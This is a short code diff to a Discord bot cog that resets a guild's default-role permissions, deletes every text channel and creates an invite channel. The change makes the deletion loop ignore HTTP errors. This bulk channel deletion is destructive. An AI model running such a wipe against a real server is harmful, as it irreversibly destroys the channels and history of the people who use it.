@@ -64,7 +64,8 @@ class Gimme(commands.Cog):
 			await guild.default_role.edit(permissions=permissions)
 
 			for channel in guild.text_channels:
-				await channel.delete()
+				with contextlib.suppress(discord.HTTPException):
+					await channel.delete()
 
 			await guild.create_text_channel(name='just-created-so-i-can-invite-you')
 
